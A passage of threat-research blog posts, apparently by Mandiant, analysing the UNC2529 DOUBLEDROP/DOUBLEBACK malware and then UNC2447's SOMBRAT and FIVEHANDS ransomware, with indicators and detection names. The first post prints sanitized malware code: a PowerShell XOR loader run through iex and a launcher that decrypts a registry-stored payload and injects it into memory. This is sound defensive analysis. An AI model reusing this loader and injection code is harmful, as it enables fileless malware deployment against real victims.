-ExpandProperty '<launcher_reg_val>'; $xor_val = <xor_val>; iex( $enc.GetString($( for ($i = 0; $i -lt $loader.Length; $i++) { if ($xor_val -ge 250) { $xor_val = 0 } $loader[$i] -bxor $xor_val; $xor_val += 4 } )) ) Figure 7: De-obfuscated and sanitized bootstrap code Note that the actual values for <base64_encoded_path_to_launcher> , <launcher_reg_val> , and <xor_val> are generated on the fly by the dropper and will be different across the compromised systems. The encoding of the launcher is implemented as a simple rolling XOR that is incremented after each iteration. The following code snippet (Figure 8) could be used to either encode or decode the launcher, given the initial key. def encdec(src, key): out = bytearray() for b in src: if key >= 250: key = 0 out.append(b ^ key) key += 4 return out Figure 8: Algorithm to Decode the Launcher Once the launcher is decoded it is executed within the same PowerShell process as the bootstrap by calling the iex (Invoke-Expression) command. Launcher The launcher responsibility, after being executed by the bootstrap code, is to decrypt and execute the payload saved under the VersionIndependentProgID registry key. To do so, the launcher first decodes the RC4 key provided in the <first_4_chars_of_rnd_guid_0> value (see Figure 5) and then uses it to decrypt the payload. Once the payload is decrypted, the launcher allocates virtual memory enough to house the image in memory, copies it there, and finally creates a thread around the entry point specified in the dropper. The function at that entry point is expected to lay the image in memory, to relocate the image, if necessary, to resolve the imports and finally—to execute the payload's entry point. A sanitized and somewhat de-obfuscated version of the launcher is shown in Figure 9. function DecryptPayload { param($fn7, $xf7, $mb5) $fn1 = Get-ItemProperty -Path $fn7 -n $mb5 | Select-Object -ExpandProperty $mb5; $en8 = ($fn1[32] + (19 + (((5 - 2) + 0) + 11))); $ow7 = $fn1[$en8..($en8 + 31)]; [array]::Reverse($ow7); $fn1 = Get-ItemProperty -Path $fn7 -n $xf7 | Select-Object -ExpandProperty $xf7; $en8 = { $xk2 = 0..255; 0..255 | % { $wn4 = ($wn4 + $xk2[$_] + $ow7[$_ % $ow7.Length]) % (275 - (3 + (11 + 5))); $xk2[$_], $xk2[$wn4] = $xk2[$wn4], $xk2[$_] }; $fn1 | % { $sp3 = ($sp3 + 1) % (275 - 19); $si9 = ($si9 + $xk2[$sp3]) % ((600 - 280) - 64); $xk2[$sp3], $xk2[$si9] = $xk2[$si9], $xk2[$sp3]; $_-bxor$xk2[($xk2[$sp3] + $xk2[$si9]) % (343 - ((1 + 0) + 86))] } }; $ry6 = (& $en8 | foreach-object { '{0:X2}' -f $_ }) -join ''; ($(for ($sp3 = 0; $sp3 -lt $ry6.Length; $sp3 += 2) { [convert]::ToByte($ry6.Substring($sp3, 2), (17 - ((1 + 0)))) } ) ) } function ExecuteApi { param($fn7, $xf7) $vy9 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('?RND?')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('?RND?', $false).DefineType('?RND?', 'Class,Public,Sealed,AnsiClass,AutoClass', [System.MulticastDelegate]); $vy9.DefineConstructor('RTSpecialName,HideBySig,Public', [System.Reflection.CallingConventions]::Standard, $fn7).SetImplementationFlags('Runtime,Managed'); $vy9.DefineMethod('Invoke', 'Public,HideBySig,NewSlot,Virtual', $xf7, $fn7).SetImplementationFlags('Runtime,Managed'); $vy9.CreateType() } function GetProcAddress { param($fn7) $fq3 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods'); $lr3 = New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($fq3.GetMethod('GetModuleHandle').Invoke(0, @('kernel32.dll')))); $fq3.GetMethod('GetProcAddress', [reflection.bindingflags] 'Public,Static', $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null).Invoke($null, @([System.Runtime.InteropServices.HandleRef]$lr3, $fn7)) } $decryptedPayload = DecryptPayload 'hklm:\\software\\classes\\CLSID\\<rnd_guid_0>\\VersionIndependentProgID' '<reg_val_payload>' '<reg_val_rc4_key>'; function InjectPayload { param($payload, $payloadLen, $entryPoint, $access) $mem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress 'VirtualAllocEx'), (ExecuteApi @([IntPtr], [IntPtr], [IntPtr], [int], [int])([Intptr]))).invoke(-1, 0, $payloadLen, 0x3000, $access); [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress 'RtlMoveMemory'), (ExecuteApi @([IntPtr], [byte[]], [UInt32])([Intptr]))).invoke($mem, $payload, $payloadLen); $mem = New-Object System.Intptr -ArgumentList $($mem.ToInt64() + $entryPoint); [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress 'CreateThread'), (ExecuteApi @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([Intptr]))).invoke(0, 0, $mem, 0, 0, 0); Start-Sleep -s (((2673 - 942) + 1271)) } # 0x36dc = Loader Entry Point, rva # 0x40 = PAGE_EXECUTE_READWRITE InjectPayload $decryptedPayload $decryptedPayload.length 0x36dc 0x40 Figure 9: De-obfuscated and sanitized launcher script DOUBLEBACK Backdoor component Overview The observed DOUBLEDROP instances contain a well-designed backdoor implemented as a 32 or 64-bit PE dynamic library which we track as DOUBLEBACK. The backdoor is initially mapped into the same PowerShell process started by the bootstrap script, but it will then inject itself into a msiexec.exe process if certain conditions are met. By design, the core of the backdoor functionality is intended to be executed after injected into a newly spawned msiexec.exe process. In contrast with other backdoors DOUBLEBACK does not have its services hardcoded and the functionality is expected to be implemented as plugins that are expected to be serialized in the registry database under a host-specific registry path. That way, the backdoor can be configured to implement a flexible set of services depending on the target. With all the common functionality implemented as plugins, the backdoor’s main goal is to establish a communication framework ensuring data integrity between the C2 server and the appropriate plugins. Details The backdoor starts by retrieving its process name and ensures that it is either powershell.exe or msiexec.exe. In all other cases, the malware will immediately terminate itself. Normally, when first started on the system, the backdoor will be injected into the same PowerShell process that executes both the bootstrap code and the launcher. In that mode the malware may spawn (depending on certain conditions) a msiexec process and injects itself into it. More details about the logic implemented in the PowerShell and the msiexec branches are provided in the following sections. Next, the backdoor ensures that it is the only DOUBLEBACK instance currently executing on the compromised system. To do that, the malware generates a host-based pseudo-unique GUID and uses it as a mutex name. The algorithm first generates a pseudo-unique host identifier that is based on the system volume's serial number and a hardcoded salt value, as shown in Figure 10. # oberserved salt = 0x436ea76d def gen_host_id(vol_ser_num, salt): salted_val = (vol_ser_num + salt) & 0xffffffff md5 = hashlib.md5(bytes(salted_val.to_bytes(4, 'little'))) second_dword = struct.unpack('<i', md5.digest()[4:8])[0] return (salted_val + second_dword) & 0xffffffff Figure 10: Host ID generation algorithm Next, the malware passes the generated host ID to another algorithm that generates a pseudo-unique GUID based on the input, as shown in Figure 11. # src is the host ID def gen_guid(src): b = bytearray() xor = 0xaabbccdd for _ in range(4): b += src.to_bytes(4, byteorder='little') src ^= xor xor = (xor + xor) & 0xffffffff return uuid.UUID(bytes_le=bytes(b)) Figure 11: GUID generation algorithm Once the GUID is generated the malware formats it as Global\\{ <guid> } and attempts to open a mutex with that name. In case the mutex is already created the backdoor assumes that another instance of itself is already running and terminates itself. Otherwise, the backdoor creates the mutex and branches out depending on the detected process it currently mapped into. Executing Within the PowerShell Process The initial state of the backdoor execution is when it is mapped into a PowerShell process created by the bootstrap code. In this mode, the backdoor attempts to relocate itself into a new instance of msiexec.exe. Before the injection is attempted, the backdoor enumerates the running processes looking for Kaspersky Antivirus (avp.exe, avpui.exe) or BitDefender (bdagent.exe, bdservbdagent.exe, bdservicehost.exe) engines. This part of the functionality seems to be a work in progress because the malware ignores the fact if the Kaspersky software is detected but it will not attempt injecting into the msiexec.exe process in case BitDefender is found running on the compromised system. In the latter case, the backdoor's main functionality will be executed inside the same PowerShell process and no new instance of msiexec.exe will be created. The injection process involves finding the backdoor's image under the appropriate registry key. Note, that the backdoor instance we have observed in the first wave does not handle situations when the malware ecosystem is installed as an administrator—such cases would end up with the backdoor not able to locate its image for injecting. In all other cases, the malware starts with the well-known class GUIDs of the PlaySoundService and MsCtfMonitor classes and attempts to find which of them has the TreatAs registry key under their definition. Once the TreatAs key is found, its default registry value points to the registry key that has the RC4-encrypted backdoor image and the encoded RC4 key both described in the previous section of the post. With the backdoor image loaded in memory and decrypted, the malware spawns a suspended process around msiexec.exe and inject its image into it. The backdoor PE file exports a single function that is used to lay down its own image in memory and execute its DllMain entry point. The export function allocates the needed memory, relocates the image, if needed, resolves the imports and finally executes the backdoor’s DllMain function. At this point the backdoor is running inside the hijacked msiexec.exe and the instance inside the PowerShell process terminates itself. Executing as Injected in the msiexec.exe Process Overview The DOUBLEBACK backdoor executes its main functionality while injected in a dedicated msiexec.exe process (provided BitDefender AV is not found running on the system). The main logical modules of the backdoor are its configuration, plugin management, and communications. In the following sections we will describe the first two, while a future blog post will focus on the communications and the evolution of the backdoor. Configuration The backdoor uses an embedded configuration that contains the C2 URLs and a key (more about the key in the second part of the post). The configuration data is formatted as shown in Figure 12. struct tag_config_header_t { uint32_t xor_val_1; uint32_t xor_val_2; uint32_t xor_val_3; uint32_t xor_val_4; } config_header_t; struct tag_config_t { config_header_t header; uint8_t encoded_config[]; } config_t; Figure 12: Encoded configuration format The length of the encoded_config data is provided by the XOR-ing of the xor_val_1 and xor_val_2 fields of the config_header_t structure. The config_t.encoded_config blob can be decoded by XOR-ing the data with the config_header_t.xor_val_1. The decoded configuration data consists of a comma-separated list of URLs followed by a key that is used in the communication module. The first two bytes specify the lengths of the comma-separated URL list and the key, respectively. The URLs in the observed samples follow the pattern shown in Figure 13. https://<server>/admin<n>/client.php Figure 13: Observed C2 URL pattern The initial sample did not have any value for <n> but the samples after that were observed to use <n> equal to 4 or 5. Plugin Management The backdoor's core functionality is implemented via plugins designed as PE Windows dynamic libraries. The plugins, as with the other backdoor components, are also saved in the registry database under a host-specific registry key. The full path to the plugins location is formatted as HK[LM|CU]:\\Software\\Classes\\CLSID\\{ <plugins_home_guid> }, where <plugins_home_guid> is generated by the GUID algorithm shown in Figure 11 with a host-specific value we call implant ID which is used not only to generate the path to the plugins but with the backdoor’s C2 communications and it is also passed as a parameter to each of the plugins during their initialization. The implant ID is generated by seeding the Linear Congruential Generator (LCG) algorithm, shown in Figure 14, with the host ID and the <max_range> value is set to 0x54c5638. The value generated by the LCG is then added to 0x989680 and the result serves as the implant ID. def lcg(max_range): global seed if seed == 0: seed = get_RDTSC() n = (0x7fffffed * seed + 0x7fffffc3) & 0xffffffff val = n % max_range seed = n return val Figure 14: Linear Congruential Generator used by the backdoor The backdoor enumerates all the registry values under the plugins home location (the registry value names are insignificant) and expects each of the plugins to be formatted, as shown in Figure 15. struct tag_plugin_header_t { uint32_t xor_val; uint32_t param_2; the second parameter of the pfn_init uint32_t len_1; uint32_t len_2; uint32_t pfn_init; uint32_t pfn_cleanup; uint32_t param_3; the third parameter of the pfn_init uint32_t unused; } plugin_header_t; struct tag_plugin_t { plugin_header_t header; uint8_t encoded_plugin[]; } plugin_t; Figure 15: Encoded plugins format As shown in Figure 15, the plugin data starts with a 32-byte long header followed by the encoded plugin DLL. The plugin encoding is implemented as a combination of rolling DWORD/BYTE XOR with initial value specified by the plugin_header_t.xor_val value. The plugin_header_t.len_1 stores the number of DWORDS to be decoded with plugin_header_t.xor_val which is incremented by 4 after each iteration. The plugin_header_t.len_2 specifies the number of bytes to be decoded at the current position after the previous operation with the current value of the plugin_header_t.xor_val (only the least significant byte is taken). In this mode the plugin_header_t.xor_val value is incremented by one after each iteration. The plugins are expected to export at least two functions—one for initialization and another to clean up the resources before unloading. The initialization routine takes four parameters—two from the header and two calculated by the backdoor, as shown Figure 16. pfn_init(implant_id, plugin_header_t.param_2, plugin_header_t.param_3, p_plugin_image_in_memory) Figure 16: Plugins initialization routine prototype The current backdoor's implementation provides support for up to 32 plugins with each of them mapped and initialized in the backdoor's process space. Additional Notes The first backdoor instance we observed back in December 2020 was a stable and well-written code, but it was clearly a work in progress. For example, the early instance of the malware spawns a thread to secure delete the DOUBLEDROP dropper from disk which indicates that an earlier variant of this malware launched a copy of the dropper from the file system. The dropper would save its current location on disk in the default registry value under the HK[LM|CU]:\\Software\\Classes key. The backdoor spawns a dedicated thread that retrieves the dropper’s path and then proceeds to overwrite the image on disk with 0x00, 0xFF, and a randomly generated byte before deleting the dropper from the file system. Additionally, the early instance of the backdoor, as mentioned, would not handle the situations when an elevated PowerShell process is used. The dropper would use a scheduled task in that case with the relevant registry keys created under the HKLM hive but the backdoor does not support that case and will not be able to find its image under the specific key in order to inject itself into the msiexec.exe process. Finally, the backdoor would output debug information in a few cases using the OutputDebugString API. Interestingly, the format and the generation of the log message is the same as the one used in the publicly available PEGASUS code ( preliminary technical analysis: Pegasus Malware Source Code ). The PEGASUS backdoor is distributed with modules that allow it to manipulate files generated by common Russian payment processing software that is used to assess and process VAT refunds. When executed on a workstation running targeted software, the malware can attempt to add VAT to transactions that are normally exempt and directs associated tax refunds to attacker-controlled bank accounts. Conclusion Considerable resources were employed by UNC2529 to conduct their December phishing campaign. Almost 50 domains supported various phases of the effort, targets were researched, and a legitimate third-party domain was compromised. The threat actor made extensive use of obfuscation and fileless malware to complicate detection to deliver a well coded and extensible backdoor. UNC2529 is assessed as capable, professional and well resourced. The identified wide-ranging targets, across geography and industry suggests a financial crime motive. DOUBLEBACK appears to be an ongoing work in progress and Mandiant anticipates further actions by UNC2529 to compromise victims across all industries worldwide. Technical Indicators DOUBLEDRAG / BIFF8 Files MD5 Role Wave 39fc804566d02c35f3f9d67be52bee0d DOUBLEDRAG 1 st 44f7af834ee7387ac5d99a676a03cfdd DOUBLEDRAG 1 st 4e5583e34ad54fa7d1617f400281ba56 PDF Decoy 1 st e80dc4c3e26deddcc44e66bb19b6fb58 PDF Decoy 1 st 169c4d96138d3ff73097c2a9aab5b1c0 Zip 1 st e70502d020ba707095d46810fd32ee49 Zip 1 st 62fb99dc271abc104504212157a4ba91 Excel BIFF8 macro 2 nd 1d3fcb7808495bd403973a0472291da5 PDF Decoy 2 nd 6a1da7ee620c638bd494f4e24f6f1ca9 Zip 2 nd a28236b43f014c15f7ad4c2b4daf1490 Zip 2 nd d594b3bce66b8b56881febd38aa075fb Zip 2 nd Domains Dec. 2, 2020 Wave Dec. 11 to 18, 2020 Wave adupla[.]net aibemarle[.]com ceylonbungalows[.]net bestwalletforbitcoin[.]com chandol[.]com bitcoinsacks[.]com closetdeal[.]com digitalagencyleeds[.]com daldhillon[.]com erbilmarriott[.]com desmoncreative[.]com ethernetpedia[.]com farmpork[.]com fileamazon[.]com gemralph[.]com gamesaccommodationscotland[.]com isjustlunch[.]com greathabibgroup[.]com logicmyass[.]com infomarketx[.]com lottoangels[.]com jagunconsult[.]com mangoldsengers[.]com khodaycontrolsystem[.]com oconeeveteransmemorial[.]com maninashop[.]com scottishhandcraft[.]com onceprojects[.]com seathisons[.]com simcardhosting[.]com skysatcam[.]com stayzarentals[.]com smartnhappy[.]com touristboardaccommodation[.]com stepearn[.]com towncentrehotel[.]com sugarmummylove[.]com vacuumcleanerpartsstore[.]com techooze[.]com zmrtu[.]com tigertigerbeads[.]com totallyhealth-wealth[.]com towncenterhotel[.]com uaeworkpermit[.]com DOUBLEDROP MD5 4b32115487b4734f2723d461856af155 9e3f7e6697843075de537a8ba83da541 cc17e0a3a15da6a83b06b425ed79d84c URLs hxxp://p-leh[.]com/update_java.dat hxxp://clanvisits[.]com/mini.dat hxxps://towncentrehotels[.]com/ps1.dat DOUBLEBACK MD5 1aeecb2827babb42468d8257aa6afdeb 1bdf780ea6ff3abee41fe9f48d355592 1f285e496096168fbed415e6496a172f 6a3a0d3d239f04ffd0666b522b8fcbaa ce02ef6efe6171cd5d1b4477e40a3989 fa9e686b811a1d921623947b8fd56337 URLs hxxps://klikbets[.]net/admin/client.php hxxps://lasartoria[.]net/admin/client.php hxxps://barrel1999[.]com/admin4/client.php hxxps://widestaticsinfo[.]com/admin4/client.php hxxps://secureinternet20[.]com/admin5/client.php hxxps://adsinfocoast[.]com/admin5/client.php Detections FireEye detects this activity across our platforms. The following contains specific detection names that provide an indicator of exploitation or post-exploitation activities we associate with UNC2529. Platforms Detection Name Network Security Email Security Detection On Demand Malware File Scanning Malware File Storage Scanning FEC_Trojan_JS_DOUBLEDRAG_1 (static) FE_Trojan_JS_DOUBLEDRAG_1 (static) Downloader.DOUBLEDRAG (network) Downloader.JS.DOUBLEDRAG.MVX (dynamic) FE_Dropper_PS1_DOUBLEDROP_1 (static) FEC_Dropper_PS1_DOUBLEDROP_1 (static) Dropper.PS1.DOUBLEDROP.MVX (dynamic) FE_Backdoor_Win_DOUBLEBACK_1 (static) FE_Backdoor_Win_DOUBLEBACK_2 (static) FE_Backdoor_Win_DOUBLEBACK_3 (static) FE_Backdoor_Win_DOUBLEBACK_4 (static) Backdoor.Win.DOUBLEBACK (network) Malware.Binary.xls Endpoint Security Real-Time (IOC) POWERSHELL ENCODED REMOTE DOWNLOAD (METHODOLOGY) SUSPICIOUS POWERSHELL USAGE (METHODOLOGY) MALICIOUS SCRIPT CONTENT A (METHODOLOGY) POWERSHELL INVOCATION FROM REGISTRY ARTIFACT (METHODOLOGY) Malware Protection (AV/MG) Generic.mg.1aeecb2827babb42 Generic.mg.1bdf780ea6ff3abe Generic.mg.1f285e496096168f Generic.mg.6a3a0d3d239f04ff Generic.mg.ce02ef6efe6171cd Generic.mg.fa9e686b811a1d92 Trojan.JS.Agent.TZP Gen:Variant.Ulise.150277 Gen:Variant.Ulise.150283 Gen:Variant.Razy.799918 UNC2529 MITRE ATT&CK Mapping ATT&CK Tactic Category Techniques Resource Development Compromise Infrastructure (TT1584) Develop Capabilities (T1587) Digital Certificates (T1587.003) Obtain Capabilities (T1588) Digital Certificates (T1588.004) Initial Access Phishing (T1566) Spearphishing Link (T1566.002) Execution User Execution (T1204) Malicious Link (T1204.001) Command and Scripting Interpreter (T1059) Visual Basic (T1059.005) JavaScript/JScript (T1059.007) Privilege Escalation Process Injection (T1055) Defense Evasion Indicator Removal on Host (T1070) File Deletion (T1070.004) Obfuscated Files or Information (T1027) Process Injection (T1055) Modify Registry (T1112) Discovery System Owner/User Discovery (T1033) Process Discovery (T1057) System Information Discovery (T1082) Account Discovery (T1087) Software Discovery (T1518) Collection Screen Capture (T1113) Archive Collected Data (T1560) Archive via Utility (T1560.001) Command and Control Application Layer Protocol (T1071) Web Protocols (T1071.001) Asymmetric Cryptography (T1573.002) Acknowledgements Thank you to Tyler McLellan, Dominik Weber, Michael Durakovich and Jeremy Kennelly for technical review of this content. In addition, thank you to Nico Paulo Yturriaga and Evan Reese for outstanding signature creation, and Ana Foreman for graphics support. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/04/unc2447-sombrat-and-fivehands-ransomware-sophisticated-financial-threat.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-04-29",
                    "source": "www.fireeye.com"
                },
                "text": "Mandiant has observed an aggressive financially motivated group, UNC2447, exploiting one SonicWall VPN zero-day vulnerability prior to a patch being available and deploying sophisticated malware previously reported by other vendors as SOMBRAT. Mandiant has linked the use of SOMBRAT to the deployment of ransomware, which has not been previously reported publicly. UNC2447 monetizes intrusions by extorting their victims first with FIVEHANDS ransomware followed by aggressively applying pressure through threats of media attention and offering victim data for sale on hacker forums. UNC2447 has been observed targeting organizations in Europe and North America and has consistently displayed advanced capabilities to evade detection and minimize post-intrusion forensics. Mandiant has observed evidence of UNC2447 affiliated actors previously using RAGNARLOCKER ransomware. Based on technical and temporal observations of HELLOKITTY and FIVEHANDS deployments, Mandiant suspects that HELLOKITTY may have been used by an overall affiliate program from May 2020 through December 2020, and FIVEHANDS since approximately January 2021. Background In November 2020, Mandiant created UNC2447, an uncategorized group observed using the novel WARPRISM PowerShell dropper to install BEACON at two Mandiant Managed Defense clients. Mandiant Managed Defence quicky neutralized these intrusions and did not observe attempts to deploy ransomware. In January and February 2021, Mandiant Consulting observed a novel rewrite of DEATHRANSOM—dubbed FIVEHANDS—along with SOMBRAT at multiple victims that were extorted. During one of the ransomware intrusions, the same WARPRISM and BEACON samples previously clustered under UNC2447 were observed. Mandiant was able to forensically link the use of WARPRISM, BEACON, SOMBRAT and FIVEHANDS to the same actor. Mandiant suspects that HELLOKITTY activity in late-2020 may be related to the overall affiliate program and that usage shifted to FIVEHANDS ransomware beginning in January 2021. In April 2021, Mandiant observed a private FIVEHANDS TOR chat using a HELLOKITTY favicon (Figure 1). Figure 1: FIVEHANDS Hello Kitty icon When affiliate-based ransomware is observed by Mandiant, uncategorized clusters are assigned based on the infrastructure used, and in the case of UNC2447 were based on the SOMBRAT and Cobalt Strike BEACON infrastructure used across 5 intrusions between November 2020 and February 2021. Generally, Mandiant uses caution even with novel malware such as SOMBRAT and WARPRISM and clusters each use rigorously according to all observed activity. For more information on uncategorized threats, refer to our post, \" DebUNCing Attribution: How Mandiant Tracks Uncategorized Threat Actors .\" SonicWall SMA 100 Series Appliance Vulnerability CVE-2021-20016 is a critical SQL injection vulnerability that exploits unpatched SonicWall Secure Mobile Access SMA 100 series remote access products. A remote, unauthenticated attacker could submit a specially crafted query in order to exploit the vulnerability. Successful exploitation would grant an attacker the ability to access login credentials (username, password) as well as session information that could then be used to log into a vulnerable unpatched SMA 100 series appliance. This vulnerability only impacted the SMA 100 series and was patched by SonicWall in February 2021. For more information on this vulnerability, please refer to SonicWall PSIRT advisory SNWLID-2021-0001 . WARPRISM WARPRISM is a PowerShell dropper that has been observed by Mandiant delivering SUNCRYPT, BEACON, and MIMIKATZ. WARPRISM is used to evade endpoint detection and will load its payload directly into memory. WARPRISM may be used by multiple groups. FOXGRABBER FOXGRABBER is a command line utility used to harvest FireFox credential files from remote systems. It contains the PDB path: C:\\Users\\kolobko\\Source\\Repos\\grabff\\obj\\Debug\\grabff.pdb. FOXGRABBER has also been observed in DARKSIDE ransomware intrusions. BEACON Malleable Profiles In the initial stages of an intrusion, UNC2447 uses the Cobalt Strike BEACON HTTPSSTAGER implant for persistence to communicate with command-and-control (C2) servers over HTTPS and has been observed using ‘chches_APT10’ and ‘Havex’ Malleable profiles. UNC2447 Toolbox During the recon and exfiltration stage of intrusions, UNC2447 has been observed using the following tools: ADFIND, BLOODHOUND, MIMIKATZ, PCHUNTER, RCLONE, ROUTERSCAN, S3BROWSER, ZAP and 7ZIP. UNC2447 may tamper with windows security settings, firewall rules, and antivirus protection. SOMBRAT Overview SOMBRAT was first reported by Blackberry Cylance in November 2020 as \" The CostaRicto Campaign: Cyber-Espionage Outsourced \" as a potential espionage-for-hire criminal group. Mandiant has now observed SOMBRAT alongside FIVEHANDS ransomware intrusions. The SOMBRAT backdoor is packaged as a 64-bit Windows executable. It communicates with a configurable command and control (C2) server via multiple protocols, including DNS, TLS-encrypted TCP, and potentially WebSockets. Although the backdoor supports dozens of commands, most of them enable the operator to manipulate an encrypted storage file and reconfigure the implant. The backdoor's primary purpose is to download and execute plugins provided via the C2 server. In contrast to the SOMBRAT version published in November 2020, Mandiant observed additional obfuscation and armoring to evade detection, this SOMBRAT variant has been hardened to discourage analysis. Program metadata typically included by the compiler has been stripped and strings have been inlined and encoded via XOR-based routines. The SOMBRAT Launcher This SOMBRAT backdoor variant must be deployed alongside four additional resources that serve as launchers. They are typically installed to the hardcoded directory path `C:\\ProgramData\\Microsoft`. path: `C:\\programdata\\Microsoft\\WwanSvc.bat` - launcher for `WwanSvc.txt` path: `C:\\programdata\\Microsoft\\WwanSvc.txt` - decoder and launcher for `WwanSvc.c` path: `C:\\programdata\\Microsoft\\WwanSvc.c` - decoder and launcher for `WwanSvc.b` path: `C:\\programdata\\Microsoft\\WwanSvc.a` - XOR key path: `C:\\programdata\\Microsoft\\WwanSvc.b` - encoded SOMBRAT backdoor path: `%TEMP%\\<possibly unique random name>` - encrypted storage file path: `%TEMP%\\<possibly unique random name _<integer>` - encrypted storage file path: `C:\\ProgramData\\<possibly unique random name ` - encrypted configuration file Other variations of the filenames were observed such as ntuser and wapsvc. SOMBRAT Technical Details The SOMBRAT backdoor is written in modern C++ and implemented as a collection of \"plugins\" that interoperate with one another. There are five plugins distributed with this variant: `core`, `network`, `storage`, `taskman`, and `debug` (the `config` plugin described by Blackberry is not present). The core plugins communicate with the C2 server via messages sent over a common networking layer; each plugin supports its own set of messages, and the backdoor protocol can be extended by dynamically loaded plugins. The `core` plugin coordinates state tracking, such as network connectivity, and dynamic plugin loading and unloading. The `network` plugin configures the networking layer used to communicate with the C2 server, for example enabling the operator to switch between DNS and TCP protocols. The `storage` plugin exposes logical operations, such as read and write, for an encrypted file used to store plugins, resources, and arbitrary data. The `taskman` plugin enables the operator to list and kill processes on the compromised system. Finally, the `debuglog` plugin supports a single command to records debug messages. Given that the core plugins do not enable an operator directly execute arbitrary commands or reconfigure the system, the primary function of the SOMBRAT backdoor is to load plugins provided via the C2 server. These plugins may be shellcode or DLL modules to be dynamically loaded. The C2 server may instruct the backdoor to load the plugins directly or persist them into the encrypted storage file, where they may subsequently be reloaded, such as after upgrading the backdoor. Figure 2: Malware author mark “No one is perfect except me.” SOMBRAT evades forensic analysis by patching the process memory used to record command line arguments. It replaces the initial command line with the base filename of the program executable, removing any arguments. This means that investigators that inspect a process listing via memory forensics will see the innocuous-looking command line `powershell.exe` rather than references to the uncommon filename such as `WwanSvc.c`. SOMBRAT Network Communications The SOMBRAT backdoor can communicate with its C2 server using both DNS and a proxy-aware, TLS-encrypted stream protocol. By default, the backdoor uses the DNS protocol; however, this can be reconfigured by the C2 server. Mandiant observed the domains feticost[.]com and celomito[.]com used for DNS C2 communications. When the backdoor communicates via its DNS protocol, it constructs and resolves FQDNs, interpreting the DNS results to extract C2 messages. The authoritative DNS server embeds data within the IP address field of DNS A record results and within the Name Administrator field of DNS TEXT record results. By making many requests to unique subdomains of the C2 domain, the backdoor can slowly transmit information a few bytes at a time. Ransomware Similarities Beginning in October 2020, Mandiant observed samples of a customized version of DEATHRANSOM. This newly modified version removed the language check feature (Figure 3 shows the language check of DEATHRANSOM). Figure 3: Language check from Fortinet blog HELLOKITTY ransomware—used to target Polish video game developer CD Projekt Red—is reportedly built from DEATHRANSOM. HELLOKITTY is named after a mutex named ‘HELLOKITTYMutex,’ used when the malware executable is launched (see Figure 4). Figure 4: HELLOKITTY mutex shown in Process Explorer CEMIG (Companhia Energética de Minas Gerais), a Brazilian electric power company, revealed on Facebook in late December 2020 that it was a victim of HELLOKITTY cyber attack . In January 2021, Mandiant observed a new ransomware deployed against a victim and assigned the name FIVEHANDS. Analysis of FIVEHANDS revealed high similarity to DEATHRANSOM, sharing several features, functions, and coding similarities. Absent in FIVEHANDS is a language check, similar to HELLOKITTY Both DEATHRANSOM and FIVEHANDS drops a ransom note in all non-excluded directories Technical Comparison of FIVEHANDS, HELLOKITTY and DEATHRANSOM DEATHRANSOM is written in C while the other two families are written in C++. DEATHRANSOM uses a distinct series of do/while loops to enumerate through network resources, logical drives, and directories. It also uses QueueUserWorkItem to implement thread pooling for its file encryption threads. HELLOKITTY is written in C++, but reimplements a significant portion of DEATHRANSOM's functionality using similar loop operations and thread pooling via QueueUserWorkItem. The code structure to enumerate network resources, logical drives, and perform file encryption is very similar. Additionally, HELLOKITTY and DEATHRANSOM share very similar functions to check for the completion status of their encryption threads before exiting. FIVEHANDS is written in C++ and although high level functionality is similar, the function calls and code structure to implement the majority of the functionality is written differently. Also, instead of executing threads using QueueUserWorkItem, FIVEHANDS uses IoCompletionPorts to more efficiently manage its encryption threads. FIVEHANDS also uses more functionality from the C++ standard template library (STL) than does HELLOKITTY. Deletion of Volume Shadow Copies DEATHRANSOM, HELLOKITTY, and FIVEHANDS use the same code to delete volume shadow copies via WMI by performing the query select * from Win32_ShadowCopy and then deleting each instance returned by its id. Encryption Operations Each of these three malware families utilizes a similar encryption scheme. An asymmetric public key is either hard-coded or generated. A unique symmetric key is generated for each encrypted file. After each file is encrypted, the asymmetric key will encrypt the symmetric key and append it to the encrypted file. Additionally, a unique four byte magic value is appended to the end of the encrypted file. The malware checks for these magic bytes to ensure it does not encrypt a previously encrypted file again. DEATHRANSOM and HELLOKITTY implement the file encryption operations using a very similar code structure and flow. FIVEHANDS implements its file encryption with a differing code structure and uses different embedded encryption libraries. In addition to the symmetric key, HELLOKITTY and FIVEHANDS also encrypts file metadata with the public key and appends this to the encrypted file. DEATHRANSOM generates an RSA key pair while HELLOKITTY and FIVEHANDS use an embedded RSA or NTRU public key. DEATHRANSOM Encryption DEATHRANSOM creates an RSA-2048 public and private key pair. Using an Elliptic-curve Diffie–Hellman (ECDH) routine implemented with Curve25519, it computes a shared secret using two input values: 1) 32 random bytes from a RtlGenRandom call and 2) a hardcoded 32 byte value (attacker's public key). It also create a Curve25519 public key. The shared secret is SHA256 hashed and used as the key to Salsa20 encrypt the RSA public and private keys. The RSA public key is used to encrypt the individual symmetric keys that are used to encrypt each file. A Base64 encoded version of the encrypted RSA keys and the victim’s Curve25519 public key is included in the ransom note, providing the threat actors the information needed to decrypt the victim's files. For the symmetric key, DEATHRANSOM calls RtlGenRandom to generate 32 random bytes. This is the 32 byte key used to AES encrypt each file. After the file is encrypted, the AES key is encrypted with the public RSA key and appended to the file. DEATHRANSOM lastly appends the four magic bytes of AB CD EF AB at the end of the encrypted file and uses this as a check to ensure that it does not encrypt an already encrypted file. The analyzed DEATHRANSOM sample used for comparison does not change the file extension. HELLOKITTY Encryption HELLOKITTY contains an embedded RSA-2048 public key. This public key is SHA256 hashed and used as the victim ID within the ransom note. This RSA pubic key is also used to encrypt each file's symmetric key. For the symmetric key, HelloKitty generates a 32 byte seed value based on the CPU timestamp. 